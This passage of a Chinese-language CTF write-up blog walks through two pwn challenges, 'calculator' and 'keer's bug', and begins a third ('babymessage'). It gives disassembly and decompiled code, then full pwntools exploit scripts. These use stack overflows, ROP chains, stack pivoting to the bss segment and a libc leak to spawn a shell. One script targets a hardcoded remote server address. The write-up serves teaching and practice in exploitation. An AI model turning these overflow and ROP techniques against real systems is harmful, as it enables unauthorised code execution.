[rbp+buf]</span><br><span class="line">mov     edx, 6          ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     rdi, rax        ; nptr</span><br><span class="line">call    _atoi</span><br><span class="line">mov     edi, eax</span><br><span class="line">call    calc</span><br><span class="line">mov     edi, offset aBye ; &quot;Bye~~~&quot;</span><br><span class="line">call    _puts</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 400DA7</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  ####    ##   #       ####  #    # #        ##   #####  ####  #####  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; #    #  #  #  #      #    # #    # #       #  #    #   #    # #    # &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; #      #    # #      #      #    # #      #    #   #   #    # #    # &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; #      ###### #      #      #    # #      ######   #   #    # #####  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; #    # #    # #      #    # #    # #      #    #   #   #    # #   #  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  ####  #    # ######  ####   ####  ###### #    #   #    ####  #    # &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;======================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my calculator&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter the number of calculations:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">6uLL</span>);</span><br><span class="line">  v3 = atoi(buf);</span><br><span class="line">  calc(v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye~~~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>atoi函数是将读入的字符串转换为整型</li>
<li>这里读了6字节进入buff，然后转换为整型，给了v3作为calc的参数</li>
</ul>
<p>calc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">calc</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// rbx</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// rbx</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rbx</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-F4h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">208</span>]; <span class="comment">// [rsp+20h] [rbp-F0h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *src; <span class="comment">// [rsp+F0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+FCh] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0x64</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    src = <span class="built_in">malloc</span>(<span class="number">4LL</span> * a1);</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &lt; a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      PrintMenu();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">      <span class="keyword">switch</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          v1 = (<span class="keyword">char</span> *)src + <span class="number">4</span> * (<span class="keyword">int</span>)v8;</span><br><span class="line">          *v1 = Add();</span><br><span class="line">          <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          v2 = (<span class="keyword">char</span> *)src + <span class="number">4</span> * (<span class="keyword">int</span>)v8;</span><br><span class="line">          *v2 = Sub();</span><br><span class="line">          <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          v3 = (<span class="keyword">char</span> *)src + <span class="number">4</span> * (<span class="keyword">int</span>)v8;</span><br><span class="line">          *v3 = Mul();</span><br><span class="line">          <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">          v4 = (<span class="keyword">char</span> *)src + <span class="number">4</span> * (<span class="keyword">int</span>)v8;</span><br><span class="line">          *v4 = Div();</span><br><span class="line">          <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">          <span class="built_in">memcpy</span>(dest, src, <span class="number">4</span> * a1);</span><br><span class="line">          <span class="built_in">free</span>(src);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Wrong,please input 1-5&quot;</span>);</span><br><span class="line">LABEL_10:</span><br><span class="line">          ++v8;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>传进来的参数,可以看出来是循环次数,且不能超过0x64(100次)</li>
<li>运算完成以后,case 5 memcpy()函数可以实现栈溢出</li>
<li>注意每次运算占4个字节</li>
</ul>
<p>add函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">Add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input x:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input y:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">  v3 = v2 + v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;the result is %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v2 + v1));</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;./calculator&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;123.60.218.232&#x27;</span></span><br><span class="line">context(binary=file_path, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">glibc_version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">p = remote(ip, <span class="number">8704</span>)</span><br><span class="line"><span class="comment"># p = process(file_path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">num1, num2</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(num1)</span><br><span class="line">    p.sendline(num2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">num1, num2</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(num1)</span><br><span class="line">    p.sendline(num2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">calc_time = <span class="string">&#x27;99&#x27;</span></span><br><span class="line">buff = (<span class="number">0xF0</span> + <span class="number">8</span>)/<span class="number">4</span> <span class="comment"># 这里是需要溢出的字节数除以每一次运算占用的字节,得到需要运算的次数</span></span><br><span class="line">pop_rdi = <span class="number">0x400ec3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400ec1</span></span><br><span class="line">system = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">scanf = elf.symbols[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line">fmtstr = <span class="number">0x400fd2</span></span><br><span class="line">bss = <span class="number">0x6020a0</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;calculations:&#x27;</span>, calc_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(buff):</span><br><span class="line">    add(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(pop_rdi) + p64(fmtstr) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(scanf) + p64(pop_rdi) + p64(bss) + p64(system)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span>(<span class="params">payload</span>):</span></span><br><span class="line">    add(<span class="string">&quot;0&quot;</span>, <span class="built_in">str</span>(payload))</span><br><span class="line">    add(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;0&quot;</span>) <span class="comment"># 因为依次运算四个字节,64位的栈8个字节</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendPayload(pop_rdi)</span><br><span class="line">sendPayload(fmtstr)</span><br><span class="line">sendPayload(pop_rsi_r15) <span class="comment"># pop了两个寄存器,需要两个参数,第二个参数无意义</span></span><br><span class="line">sendPayload(bss)</span><br><span class="line">sendPayload(<span class="number">0</span>)</span><br><span class="line">sendPayload(scanf) <span class="comment"># 注意scanf的用法:rdi是fmt这里用了&#x27;%u&#x27;,rsi是bss存放地址</span></span><br><span class="line">sendPayload(pop_rdi)</span><br><span class="line">sendPayload(bss)</span><br><span class="line">sendPayload(system)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"><span class="comment"># 执行memcpy，缓冲区溢出</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">&#x27;$0;&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># system(&quot;$0&quot;)和system(&quot;/bin/sh&quot;)相同作用</span></span><br><span class="line">shell = u64(shell) <span class="comment"># 因为是%u读取</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(shell))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;break *0x400a28&quot;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="keer’s-bug"><a href="#keer’s-bug" class="headerlink" title="keer’s bug"></a>keer’s bug</h3><blockquote>
<p>64位栈迁移</p>
</blockquote>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<ul>
<li>64位,开启了NX保护</li>
</ul>
<p>main</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">s= byte ptr -50h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 50h</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, 50h ; &#x27;P&#x27;  ; n</span><br><span class="line">mov     esi, 0          ; c</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _memset</span><br><span class="line">mov     edx, 1Dh        ; n</span><br><span class="line">mov     esi, offset aComeOnYouCanRi ; &quot;Come on!! You can ri keer!!!\n&quot;</span><br><span class="line">mov     edi, 1          ; fd</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _write</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, 70h ; &#x27;p&#x27;  ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _read</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 4005B6</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>

<ul>
<li>有一个溢出点,溢出0x70,栈大小为0x50,0x18的溢出空间不够写rop链</li>
<li>利用栈迁移,构造rop链</li>
<li>本来想在bss段写入shellcode,然后迁移栈跳转执行,注意到NX保护无论栈的地址,都是不可执行的</li>
<li>注意这里的read函数在下面的exp中使用多次,参数都是指向rbp-0x50的地址读入的</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./keer&#x27;s_bug&quot;</span></span><br><span class="line">context(binary=file_path, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">glibc_version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(ip, 8704)</span></span><br><span class="line">p = process(file_path)</span><br><span class="line"></span><br><span class="line">length = <span class="number">0x50</span>  <span class="comment"># 长度0x50主要考虑到上面read函数的buf参数在ebp-0x50的地址</span></span><br><span class="line">bss_begin = <span class="number">0x0000000000601890</span> <span class="comment"># 因为页装载的机制,bss段足够大,可以把劫持的位置向后靠一点,避免rop写到前面,无法写入的位置,报错&quot;Program received signal SIGSEGV (fault address 0x600f48)&quot;</span></span><br><span class="line">bss_end = bss_begin + length</span><br><span class="line">read = <span class="number">0x00000000004005ED</span>  <span class="comment"># 这里read的地址用了main函数里的那个,没有用plt表的位置,因为参数设置的原因</span></span><br><span class="line">write = <span class="number">0x00000000004005E8</span>  <span class="comment"># write也使用了main函数里面的地址,但没有用main函数里面的参数,注意会一直执行到main函数的ret</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400673</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400671</span></span><br><span class="line"><span class="comment"># 只找到前两个寄存器的地址,因此只能自定义两个参数</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(bss_begin) <span class="comment"># 首先把rbp的值替换掉(后面会给rsp)</span></span><br><span class="line">payload1 += p64(read)   <span class="comment"># 第一次溢出,返回给read函数接着构造下一次的溢出</span></span><br><span class="line">p.sendline(payload1)    <span class="comment"># 这里原来main的read函数结束以后,leave</span></span><br><span class="line"><span class="comment"># 此时的rbp = 0x0000000000601890,rsp还在原来的位置</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(bss_end) <span class="comment"># 这里是新rbp的值</span></span><br><span class="line">payload2 += p64(read)   <span class="comment"># 再返回给read函数构造溢出</span></span><br><span class="line">p.sendline(payload2)   <span class="comment"># 这里在上一个read函数(自己构造的第一个read)执行完成了以后,返回main函数</span></span><br><span class="line">write_libc = p.recvline()  <span class="comment"># 此时,已经完成leave,即栈已经被劫持到设计好的bss段了</span></span><br><span class="line"><span class="comment"># 此时的rbp = 0x00000000006018e0 ,rsp = 0x00000000006018a0</span></span><br><span class="line"><span class="comment"># 注意这里rsp的值,leave的时候,旧rbp的值给rsp(0x0000000000601890),然后&quot;pop rbp&quot;,将rsp所指位置的地址返回给rbp,rsp += 0x8;然后ret,相当于&quot;pop rip&quot;,rsp再加0x8</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload3 += p64(pop_rdi_ret) + p64(<span class="number">1</span>)  <span class="comment"># 这里设置了write的参数,因为没有用main函数里面的参数</span></span><br><span class="line">payload3 += p64(pop_rsi_r15_ret) + p64(write_got) + p64(<span class="number">0</span>)  <span class="comment"># 泄露got表地址得到libc基址,因为只有两个参数gadget,所以第三个参数(size,使用了上一个read函数里面的参数(rdx = 0x70))</span></span><br><span class="line">payload3 += p64(write)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"><span class="comment"># 注意rsp的地址,上一个read结束,执行到ret的时候rsp = 0x00000000006018a0,此时调用了payload2构造的read,注意read函数使用的是main函数里面的地址,是用call调用的,在调用的时候有一布push rip,此时的rsp = 0x0000000000601898,而read函数读入的位置是rbp(0x00000000006018e0)-0x50的地址(0x0000000000601890),因此需要填充0x8个&#x27;a&#x27;,直接覆盖read函数的返回地址,不会回到main函数执行leave_ret</span></span><br><span class="line"></span><br><span class="line">write_libc = u64(p.recv(<span class="number">8</span>))  <span class="comment"># 泄露了write的libc地址</span></span><br><span class="line">p.recv(<span class="number">103</span>)</span><br><span class="line">libc_base = write_libc - libc.symbols[<span class="string">&#x27;write&#x27;</span>]   <span class="comment"># 计算出基址</span></span><br><span class="line">binsh_libc = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(binsh_libc))</span></span><br><span class="line"><span class="comment"># print(hex(system_libc))</span></span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">payload4 += p64(pop_rdi_ret) + p64(binsh_libc) + p64(system_libc)</span><br><span class="line"><span class="comment"># payload3中一开始rsp指向pop_rdi_ret(0x00000000006018a0),pop后rsp += 0x8;ret,rsp += 0x8然后pop_rsi_r15_ret,两个pop一个ret,rsp += 0x18;call write,ret,rsp 不变,然后call read;rsp -= 0x8(main函数里read的参数是mov设置的)最后rsp = 0x00000000006018c0(调用read,未返回时),此时rbp = 0x00000000006018e0(没有变过),buf写入的地址在0x0000000000601890,因此需要0x30 * &#x27;a&#x27;填充,注意一共可写(0x70大小),payload4 = 0x30 + 0x18,不能太长会出错</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.send(payload4)  <span class="comment"># 成功getshell</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>注意三个地方<ul>
<li>调用read 的plt和从main函数里面调用的区别,plt是jmp调用,ret的时候直接返回rsp所指地址指向的地址,call 因为一开始会把地址push 进rsp中,所以会返回原来的地址,覆盖的时候要注意esp的变化</li>
<li>bss段足够大,一开始打的时候bss_begin设置的过于靠前,结果read 的数据,写在了不可写的位置,导致一直没打通,bss有0x1000大小.可以向后写一些</li>
<li>动调的时候,步过和步入(ni和si)会导致不同的结果,在我们覆盖read函数返回地址的时候,步过(ni)会出错,步入以后覆盖,会覆盖到正确的位置</li>
</ul>
</li>
</ul>
<h3 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h3><blockquote>
<p>栈溢出,劫持rbp,ret2libc</p>
</blockquote>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  menu();</span><br><span class="line">  work();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>menu</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to message system!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. leave name&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. leave message&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. show message&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;4. exit&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>work</p>
